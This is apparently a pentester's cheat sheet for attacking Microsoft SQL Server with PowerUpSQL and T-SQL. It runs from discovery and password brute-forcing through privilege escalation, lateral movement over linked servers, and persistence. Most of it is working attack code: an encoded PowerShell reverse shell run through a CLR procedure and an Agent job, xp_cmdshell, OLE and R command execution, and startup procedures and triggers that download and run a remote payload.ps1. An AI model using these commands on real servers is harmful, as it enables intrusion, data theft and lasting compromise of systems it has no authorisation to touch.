running powershell with different user creds

runas /noprofile /netonly /user:domain\user PowerShell.exe


SQLServer Exploitation

Using PowerupsQL

Discovery -- 

#LocalInstance

Get-SQLInstanceLocal -verbose

Get-SQLInstance -Verbose | Get-ServerInfo

Get-Service -Name MSSQL*

From Registries

$si = Get-ItemProperty -Path
'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server'
foreach ($SQLInstance in $si) {
foreach ($s in $SQLInstance.InstalledInstances){
[PSCustomObject]@{
PSComputerName = $SQLInstance.PSComputerName
InstanceName = $s}}}

------------------------------------------------------------------

#Domain

Get-SQLInstanceDomain

#Shared Service Account

Get-SQLInstanceDomain -Verbose | Group-Object deep1792

#Particular domain account

Get-SQLInstanceDomain -Verbose -domainAccount deep1792

#Server Configuration
Get-SQLInstanceDomain -Verbose | Get-SQLServerConfiguration

#Blindly broadcasting
Get-SQLInstanceBroadcast

#UDP Scan

Get-SQLInstanceScanUDP

[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()

--------------------------------------------------------------------------

#Checking access to the SQL Instance

Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Select-Object Instance.status

#Storing target to variable

$tg = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.status -like "Accessible"}

$tg
$tg | Get-ServerInfo -verbose
$tg | Get-SQLDatabase -Verbose | ft -AutoSize
$tg | Get-SQLColumn | ft -AutoSize -- dumping column name
$tg | Get-SQLColumnSampleDataThreaded –Verbose –Threads 10 –Keyword “card, password” –SampleSize 2 –ValidateCC -NoDefaults | ft -AutoSi  -- brute-forcing the column names from database
$tg | Get-DatabaseUser -Versbose | ft -Autosize

Interesting databases created with encryption flag on, or size or name

$db = $tg | Get-SQLDatabaseThreaded -Verbose -Threads 10 -NoDefaults
$db | Sort-Object DatabaseName 
$db | Where-Object {$_.is_encrypted –eq “TRUE”}

$db | Sort-Object DatabaseName | Out-GridView (much better view)

------------------------------------------------------------------------------------------------------------

Auditing weak configurations

Invoke-SQLAudit -Verbose -Instance WIN-0I.hackme.pal\SQLEXPRESS | Out-GridView

Enumerating weak login passwords:

$servers = Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -threads 10

$Accessible = $servers | where-object {$_.Status eq "Accessible"}

$Accessible

$Accessible | Invoke-SQLAuditWeakLoginPw -PassFile C:\Users\%\Desktop\passwords.txt | Out-GridView (Brute-force)

-----------------------------------------------------------------------------------------------------------------

Post Enumeration after logging into the SQL server remotely

Version - SELECT @@version
Current User - SELECT SUSER_SNAME() 
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')  -- if the current user has sysadmin privileges
Current Role – SELECT user
Current database - SELECT db_name()
List all databases - SELECT name FROM master..sysdatabases

(If below is run with sysadmin privs - more logins are shown)
All logins on server - SELECT * FROM sys.server_principals WHERE type_desc != 'SERVER_ROLE'
All database users for a database - SELECT * FROM sys.database_principals WHERE type_desc != 'DATABASE_ROLE'

(If below is run with sysadmin privs - more logins are shown)
List all sysadmin - SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin',name) = 1
List all database roles - SELECT DP1.name AS DatabaseRoleName,
isnull (DP2.name, 'No members') AS DatabaseUserName
FROM sys.database_role_members AS DRM
RIGHT OUTER JOIN sys.database_principals AS DP1
ON DRM.role_principal_id = DP1.principal_id
LEFT OUTER JOIN sys.database_principals AS DP2
ON DRM.member_principal_id = DP2.principal_id
WHERE DP1.type = 'R'
ORDER BY DP1.name; 


Effective Permissions for the server - SELECT * FROM fn_my_permissions(NULL, 'SERVER');
Effective Permissions for the database - SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
Active user token – SELECT * FROM sys.user_token
Active login token - SELECT * FROM sys.login_token


----------------------------------------------------------------------------------------------------------------------------------------------

Privlege Escalaition in SQL server can be achieved in multiple ways such as:

1. Brute force (already discussed)
2. from public to sysadmin (by exploiting misconfigured roles, or exploiting the stored procedures, or poorly granted permissions)
3. Sysadmin to OS Service account (UNC Path, command executions)
4. OS Service account to OSAdmin
5. OS Admin to sysadmin

1. User Impersonation ---- 

	i) Execute AS -- is by default a very powerful method of impersonating a user to execute a command as per the user with high privileges

User Impersonation (EXECUTE AS)
• Find SQL Server logins which can be impersonated in the current database  ----- 
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'


Invoke-SQLAuditPrivImpersonateLogin -Username deep -Password pass-Instance hackme.pal -verbose   -- using powerupsql
Invoke-SQLAuditPrivImpersonateLogin -Username deep -Password pass -Instance hackme.pal -Exploit -verbose  ---- user successfully impersonated

Command to check if the user is impersonated to sysadmin or not
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT ORIGINAL_LOGIN()

using heidisql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT ORIGINAL_LOGIN()

with multiple execute AS logins --- 
SELECT SYSTEM_USER                                      ----- from user deep 
SELECT IS_SRVROLEMEMBER('sysadmin')
EXECUTE AS LOGIN = 'dbadmin'				----- impersonating to dbadmin
SELECT SYSTEM_USER
EXECUTE AS LOGIN = 'sa'					------ impersonating from dbadmin to sa
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT ORIGINAL_LOGIN()

-------------------------------------------------------------------------------------------------------------------------------------------------

Trustworthy databases --  A trustworthy database is a property (is_trustworthy_on) which means that the database trusts the database and its contents. 
Only sysadmin can turn if off.

By default is OFF because, the impersonated user (using EXECUTE AS) can only have database in scope permissions. But if this is ON, the user will have server level permissions.

If trustworthy is ON, any user (not necessarily sa) can elevate the privileges from db_owner to sysadmin role.

To check what all trustworthy databases are present in the domain --- 
SELECT name as database_name
, SUSER_NAME(owner_sid) AS database_owner
, is_trustworthy_on AS TRUSTWORTHY
from sys.databases

Using powerUpSQL --
Invoke-SQLAuditPrivTrustworthy -Instance hackme.pal


to check the DB roles -----
use <database>
SELECT DP1.name AS DatabaseRoleName,
isnull (DP2.name, 'No members') AS DatabaseUserName
FROM sys.database_role_members AS DRM
RIGHT OUTER JOIN sys.database_principals AS DP1
ON DRM.role_principal_id = DP1.principal_id
LEFT OUTER JOIN sys.database_principals AS DP2
ON DRM.member_principal_id = DP2.principal_id
WHERE DP1.type = 'R'
ORDER BY DP1.name; 


Escalating the privileges of a trustworthy DB -----
use pentest
EXECUTE AS USER = 'dbo'
SELECT system_user
SELECT IS_SRVROLEMEMBER('sysadmin')
EXEC sp_addsrvrolemember 'deep','sysadmin'


---------------------------------------------------------------------------------------------------------------------------------------
Command Execution -- 

xp_cmdshell is bydefault is switched off till sql server-2005

USE master
EXEC xp_cmdshell 'whoami'


Invoke-SQLOSCmd -Username deep -Password pass -Instance hackme.pal -Command whoami   ------- using PowerUpSQL

----------------------

Extended stored procedure -- is a stored procedure that calls the functions from the stored DLLs residing in the sql server. Hence, this DLL extends as an extension to the SQL Server.
To register each extended stored procedure in the DLL, sysadmin rights are required. 
It executes with the privileges of the service accout and runs in the process space of SQL server.
The DLL can have any file extension and can be loaded from UNC Path or WebDAV.

sp_addextendedproc 'xp_cmdshell','xplog70.dll'  -----  If xp_cmdshell is uninstalled

EXEC sp_configure 'show advanced options',1   -----  If xp_cmdshell is disabled
RECONFIGURE
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE
EXEC master..xp_cmdshell 'whoami'   --- to check if everything is working perfectly


Using PowerUpSQL
Get-SQLStoredProcedureXP -Instance hackme.pal -Verbose  --- to check if extended stored procedure is loaded up or is present on the disk
Adding an Extended Stored Procedure
Create-SQLFileXpDll -OutFile C:\fileserver\xp_calc.dll -Command "calc.exe" -ExportName xp_calc
Get-SQLQuery -UserName sa -Password Pass –Instance hackme.pal –Query "sp_addextendedproc 'xp_calc', '\\192.168.x.x\fileserver\xp_calc.dll'"
Get-SQLQuery -UserName sa -Password Pass –Instance hackme.pal –Query "EXEC xp_calc"

Get-SQLStoredProcedureXP -Instance hackme.pal -Verbose   -----    List existing Extended stored procedures:

USE master
EXEC xp_cmdshell 'mkdir C:\mydll'
exec sp_addextendedproc 'xp_calc3', 'C:\mydll\xp_calc3.dll'
exec xp_calc3

this method is depreciated, and also is not useful, as it could create an alert if sysmon is enabled.
------------------------------------
so, there is a much better option to perform OS command injection is CLR or common language runtime is a method which allows to use the .Net code in the SQL code. 
This means that SQL server allows to write the stored procedures or malicious code by importing the DLLs.
CLR is off by default, and requires sysadmin privileges. Other roles such DDL_Admin or Create/Alter Assembly can also use it.

Enable CLR -----

use msdb
-- Enable show advanced options on the server
sp_configure 'show advanced options',1
RECONFIGURE
-- Enable clr on the server
sp_configure 'clr enabled',1
RECONFIGURE

Using PowerUpSQL to perform the command injection ---------
1..10| %{ Create-SQLFileCLRDll -Verbose -ProcedureName myfile$_ -OutDir C:\Users\deep1792\Desktop\ -OutFile myfile$_ }

Create-SQLFileCLRDll -ProcedureName "runcmd" -OutFile runcmd -OutDir C:\Users\deep1792\Desktop\   ---  to create C# code for the DLL, the DLL and SQL query with DLL as hexadecimal string
Now open the runcmd.txt and copy the statements 1 after the other and run the following commands:

USE msdb;
CREATE ASSEMBLY [lFTctGA] AUTHORIZATION [dbo] FROM 

WITH PERMISSION_SET = UNSAFE
CREATE PROCEDURE [dbo].[runcmd] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [lFTctGA].[UauFnzq].[ZvoxgPO];
EXEC[dbo].[runcmd] 'whoami'  -- run after commenting all the statement

Invoke-SQLOSCmdCLR -Username deep -Password password@123 -Instance hackme.pal –Command "whoami" -Verbose

Get-SQLStoredProcedureCLR -Instance hackme.pal -verbose


Revershell shell
1. run the below commands using heidisql
USE msdb;
CREATE ASSEMBLY [lFTctGA] AUTHORIZATION [dbo] FROM 

WITH PERMISSION_SET = UNSAFE
CREATE PROCEDURE [dbo].[runcmd] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [lFTctGA].[UauFnzq].[ZvoxgPO]

2. Now encode the one-liner powershell or any other reverse_shell using - Invoke-Encode powershell script
Invoke-Encode -DataToEncode reverse-shell.ps1 -OutCommand -- this will generate 2 files 

3. Now from encodedcommand.txt file, copy the command and run the following command:

EXEC[dbo].[runcmd] 'powershell -e SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAgACgAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBEAGUAZgBsAGEAdABlAFMAdAByAGUAYQBtACAAKAAkACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACAAKAAsACQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAVABaAEYAZABhADgASQB3AEYASQBiAHYAQgAvAHMAUABvAFgAUQBqAFkAZgBiAFEAMQBnACsAbQBaAGMASgBXAHQAaQBFAE0AbABWAFgAWQBoAFgAaABSADIANABQAE4AcgBGAFgAcwBFAFIAWAAxAHYAeQA5AHAAYgBlAGQAVgBEAHUASAA5AGUARQA1AGkAUgBxAG4ARQBqAE4AZwBMAEcAKwBMAGUARwBzADEALwBNAFMASQBXAEgASABQAEMARgBRAHkAUgBJAEYAaABIAFMANgBRAGMASgB2ADcAWQBMADUAVABjAGMATABvAHUATwBKADEAbgA2AEwAYgBBAGEAYgBwAEcAbwA5AFYAcQBDAHMALwBNAGEAWQB2AGgAUwB1AFcAWQBaAFMASgA4AEkAZwBYAEYASABSAGYAZQBkAEgANABrAG4ATQA1AG0AcABqADUAegBKAGIASQBCAE8AdQAxADIAcwAzADEAKwBPAE4AawBYAGIANQAvAEkARgBEAGsAMwBwAGIAYQBYAFEAZgBDAE4AWQBjAHgATABmAFkAUABaAEQAVgBhAE8AOABJAFgAWgBnAGgASQBoAG0ASgBVAGgAcwA4AFgASgBNACsATwBRAFEAdQBYAGoATgAvAHoAVwA1AEwAagBCAFkAYgBqAEMAYQBwAE0ASgBIAGcAaABlAEEAMwA4AHcAZQBNACsAaQBkAFMAeQB6AGgAYgBqAHkAcQBiAEYAcQAwAFMAVgBTAGIANABKAFoAUABBACsAagBwAFEANgBWAGUARwBCAGwAZwA5AHQALwBkAE4AaQBaAGoAWABaAGsAbABUAFoAMgBJADMAVQBMADgATQByADMAeABJAHgAeAB3AEEAeAAxADgAcwAwACsARgBqAEEATwBLAGQARwBYAGYAVwBaAGMATABhAHAAUABwADAAOQBKAGMAKwBFAFYAYQBkAGIAcgBGAFkAZwBGADIAcAB0AEcANAB2ADgARgA5AFEAdgBEAHoAMQBZAFMAOABqAHAASABZAGQAZAB6ADkAVABxADEAOQBpAFAAZAA1AFEAawBYAEYANgAvADYARgBEADkAZAA1ADgAagBGAC8AZAAwAGYAJwApACkAKQApACwAIABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACwAIABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7AA=='

4. and boom over the netcat u will be having the reverse_connection directly from OS to the attacker's machine.

---------------------------------------------------------------------------------------

OS Command Execution -- using OLE automation procedures

OLE -- Object Linking and Embeding is an API which is used to communicate b/w applications and DBMS. SQL server 6.5 later provided the capability for stored procedures to load the Component object model (used for interprocess communication) via OLE (Object linking and Embeding) stored procedures.

These are turned off by default and can be enabled with only sysadmin privileges.

Execute privileges on sp_OACreate and sp_OAMethod can also be used for executions.

The execution takes place with the privileges of service account.


Commands to enable OLE ---

sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;


Commands to open Calc.exe at the backend --------
DECLARE @output INT
DECLARE @ProgramToRun VARCHAR(255)
SET @ProgramToRun = 'Run("calc.exe")'
EXEC sp_oacreate 'wScript.Shell', @output out
EXEC sp_oamethod @output, @ProgramToRun
EXEC sp_oadestroy @output



Automated enabling, execution and reading output ---------
Invoke-SQLOSCmdCLR -Username sa -Password Password1 -Instance hackme.pal –Command "whoami" –Verbose
Invoke-SQLOSCmdCLR -Username sa -Password Password1 -Instance hackme.pal –Command "powershell –e <base64encodedscript>" -Verbose




-----------------------------------------------------------------------------------
SQL Agent jobs


• SQL Server Agent is a Windows service that executes scheduled tasks or jobs.
• A job can be scheduled, executed in response to alerts or by using sp_start_job stored procedure.
• Needs sysadmin role to create a job.
• Non-sysadmin users with the SQLAgentUserRole, SQLAgentReaderRole, and SQLAgentOperatorRole fixed database roles in the msdb database can also be used.
• The execution takes place with privileges of the SQL Server Agent service account if a proxy account is not configured.


Enable Agent Jobs ----

sp_configure 'show advanced options',1
RECONFIGURE
EXEC sp_configure 'allow updates', 0;
RECONFIGURE;
EXEC sp_configure 'Agent XPs', 1;
RECONFIGURE;



USE msdb
EXEC dbo.sp_add_job @job_name = N'PSJob'
EXEC sp_add_jobstep @job_name = N'PSJob', @step_name =
N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'powershell.exe -noexit ps', @retry_attempts = 1, @retry_interval = 5
EXEC dbo.sp_add_jobserver @job_name = N'PSJob'
EXEC dbo.sp_start_job N'PSJob'
-- EXEC dbo.sp_delete_job @job_name = N'PSJob'

Reverse connection --- 
USE msdb
EXEC dbo.sp_add_job @job_name = N'PSJob'
EXEC sp_add_jobstep @job_name = N'PSJob', @step_name =
N'test_powershell_name1', @subsystem = N'PowerShell', @command =N'powershell.exe -e SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAgACgAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBEAGUAZgBsAGEAdABlAFMAdAByAGUAYQBtACAAKAAkACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACAAKAAsACQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAVABaAEYAZABhADgASQB3AEYASQBiAHYAQgAvAHMAUABvAFgAUQBqAFkAZgBiAFEAMQBnACsAbQBaAGMASgBXAHQAaQBFAE0AbABWAFgAWQBoAFgAaABSADIANABQAE4AcgBGAFgAcwBFAFIAWAAxAHYAeQA5AHAAYgBlAGQAVgBEAHUASAA5AGUARQA1AGkAUgBxAG4ARQBqAE4AZwBMAEcAKwBMAGUARwBzADEALwBNAFMASQBXAEgASABQAEMARgBRAHkAUgBJAEYAaABIAFMANgBRAGMASgB2ADcAWQBMADUAVABjAGMATABvAHUATwBKADEAbgA2AEwAYgBBAGEAYgBwAEcAbwA5AFYAcQBDAHMALwBNAGEAWQB2AGgAUwB1AFcAWQBaAFMASgA4AEkAZwBYAEYASABSAGYAZQBkAEgANABrAG4ATQA1AG0AcABqADUAegBKAGIASQBCAE8AdQAxADIAcwAzADEAKwBPAE4AawBYAGIANQAvAEkARgBEAGsAMwBwAGIAYQBYAFEAZgBDAE4AWQBjAHgATABmAFkAUABaAEQAVgBhAE8AOABJAFgAWgBnAGgASQBoAG0ASgBVAGgAcwA4AFgASgBNACsATwBRAFEAdQBYAGoATgAvAHoAVwA1AEwAagBCAFkAYgBqAEMAYQBwAE0ASgBIAGcAaABlAEEAMwA4AHcAZQBNACsAaQBkAFMAeQB6AGgAYgBqAHkAcQBiAEYAcQAwAFMAVgBTAGIANABKAFoAUABBACsAagBwAFEANgBWAGUARwBCAGwAZwA5AHQALwBkAE4AaQBaAGoAWABaAGsAbABUAFoAMgBJADMAVQBMADgATQByADMAeABJAHgAeAB3AEEAeAAxADgAcwAwACsARgBqAEEATwBLAGQARwBYAGYAVwBaAGMATABhAHAAUABwADAAOQBKAGMAKwBFAFYAYQBkAGIAcgBGAFkAZwBGADIAcAB0AEcANAB2ADgARgA5AFEAdgBEAHoAMQBZAFMAOABqAHAASABZAGQAZAB6ADkAVABxADEAOQBpAFAAZAA1AFEAawBYAEYANgAvADYARgBEADkAZAA1ADgAagBGAC8AZAAwAGYAJwApACkAKQApACwAIABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACwAIABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7AA==', @retry_attempts = 1, @retry_interval = 5
EXEC dbo.sp_add_jobserver @job_name = N'PSJob'
EXEC dbo.sp_start_job N'PSJob'
 -- EXEC dbo.sp_delete_job @job_name = N'PSJob'


Using PowerUpSQL
• Execute commands:
Invoke-SQLOSCmdAgentJob –Subsystem PowerShell -Username sa -Password Password1 -Instance ops-sqlsrvone –Command "powershell –e <base64encodedscript>" -Verbose 
–Subsystem CmdExec
–Subsystem VBScript
–Subsystem Jscript
• List all jobs:
Get-SQLAgentJob -Instance ops -username sa -Password pass -Verbose

----------------------------------------------------------------------------------------------

External Scripts -- using R & Python in SQL server, after enabling needs the SQLServer restart
Sysadmin privileges are required. 


Using HeidiSQL ---- Enabling the External scripts -----   Installation in Windows-10

sp_configure 'external scripts enabled', 1;
RECONFIGURE WITH OVERRIDE;

sp_configure 'external scripts enabled'
EXEC sp_execute_external_script
@language=N'R',
@script=N'OutputDataSet <- data.frame(system("cmd.exe /c dir",intern=T))'
WITH RESULT SETS (([cmd_out] text));

 Invoke-SQLOSCmdR -Instance HACKMEPAL -Command "cmd.exe /c whoami.exe" -Verbose  --- using pOwerupSQL


-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Lateral Movement --- Mapping trusts  

Trusts at domain -- any SQL domain with trust enabled can let users or attackers to dump the critical information or dump credentials of other users 

Get-SQLFuzzDomainAccount -Instance WIN-0I.hackme.pal  --- fuzzing the SQL domain accounts

Get-SQLFuzzDomainAccount -Instance WIN-0I.hackme.pal -domain <other-domain>  --- cross forest

----------------------------------

Trusts at db layer -- means to extract the information from other trusted dbs using DB link (which is used to access other MSSQL DBs and other OLE DB links such as Access, Excel etc) and
also being used to execute stored procedures on linked servers.

select * from master..sysservers   ---- command to find the db links
Get-SQLServerLink -Instance HACKMEPA   --- using PSSQL


Openquery() function can be used to run queries on a linked database

EXEC sp_serveroption 'HACKMEPAL', 'DATA ACCESS', TRUE --- required sysadmin to GRANT access for data access rights

select * from openquery("HACKMEPAL",'select * from master..sysservers')

Openquery queries can be chained to access links within links (nested links)
select * from openquery("ops-mssql",'select * from openquery("ops-file",''select * from master..sysservers'')')

-----------

On the target server, either xp_cmdshell should be already enabled; or If rpcout is enabled for all links (disabled by default), xp_cmdshell can be enabled using:
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT “HACKMEPAL”


select * from openquery("ops-mssql",'select * from openquery("ops-file",''select * from openquery("dpssqlsrvtwo",''''select @@version as version;exec master..xp_cmdshell "cmd /c calc.exe"'''')'')')

Get-SQLServerLinkCrawl -Instance HACKMEPAL -Query "exec master..xp_cmdshell 'cmd /c calc.exe'"-Verbose


--------------------------------------------------------------------------------------------------------------

Priv Escalation --- from public to service account

UNC Path Injection -- 

PowerUpSQL automates this impressively (uses Inveigh -
https://github.com/Kevin-Robertson/Inveigh - as a capture
server):
Invoke-SQLUncPathInjection -Verbose -CaptureIp 192.168.x.x

Rotten Potato


---------------------------------------------------------------------------------------------------------------------------------------------------------------

Persistence --- 

i) Automatic stored procedures --- 

Create a stored procedure (assuming xp_cmdshell is already enabled):
USE master

CREATE PROCEDURE sp_autops AS EXEC master..xp_cmdshell 'powershell -C "iex (new-object System.Net.WebClient).DownloadString(''http://webserver/payload.ps1'')"'

create a startup point, so whenever the SQL server restarted, the stored procedure will be executed
EXEC sp_procoption @ProcName =
'sp_autops'
, @OptionName = 'startup'
, @OptionValue = 'on';



------------------

ii) Triggers -- 

A trigger is a special kind of stored procedure that automatically executes when an event occurs in the SQL Server.
• Three types of triggers:
– Data Definition Language (DDL) – Executes on Create, Alter and Drop statements and some system stored procedures.
– Data Manipulation Language (DML) – Executes on Insert, Update and Delete statements.
– Logon Triggers – Executes on a user logon.

• Both DML and DDL triggers execute under the context of the user that calls the trigger and are not recommended as it could lower the security of the SQL instance and can even
crash or can also cause Datbase to behave improperly


DDL  


Can be used if no custom database exists on the SQL Server.
• Create a trigger (assuming xp_cmdshell is already enabled):

CREATE Trigger [persistence_ddl_1]
ON ALL Server -- or DATABASE
FOR DDL_LOGIN_EVENTS -- See the docs below for events and event groups
AS
EXEC master..xp_cmdshell 'powershell -C "iex (new-object System.Net.WebClient).DownloadString(''http://x.x.x./exploit.ps1'')" '

DML

When using DML triggers and xp_cmdshell (or any other command execution), please keep
in mind that when the trigger gets executed by a normal user, he/she must have privileges
to do so.
• Create a trigger (assuming xp_cmdshell is already enabled):
USE master
GRANT IMPERSONATE ON LOGIN::sa to [Public];
USE testdb
CREATE TRIGGER [persistence_dml_1]
ON testdb.dbo.datatable
FOR INSERT, UPDATE, DELETE AS
EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'powershell -C "iex (new-object System.Net.WebClient).DownloadString(''http://webserver/payload.ps1'')"'



Logon  


Executes after the authentication phase of logging finishes, but before the
session is established. This makes a logon trigger ideal for triggering with a
logon failure of a low-privilege user.
• Create a trigger (assuming xp_cmdshell is already enabled):
CREATE Trigger [persistence_logon_1]
ON ALL SERVER WITH EXECUTE AS 'sa'
FOR LOGON
AS
BEGIN
IF ORIGINAL_LOGIN() = 'testuser'
EXEC master..xp_cmdshell 'powershell -C "iex (new-object
System.Net.WebClient).DownloadString(''http://<ip?/payload.ps1'')"
'
END;

---------------------------------
• List triggers:
SELECT * FROM sys.server_triggers -- All triggers
Use testdb
SELECT * FROM sys.server_triggers --Triggers for a database

Get-SQLTriggerDdl -Instance <sql-instance>  -username sa -Password Pass-Verbose

Get-SQLTriggerDml -Instance <sql-instance> -username sa -Password Pass -Verbose


---------------------
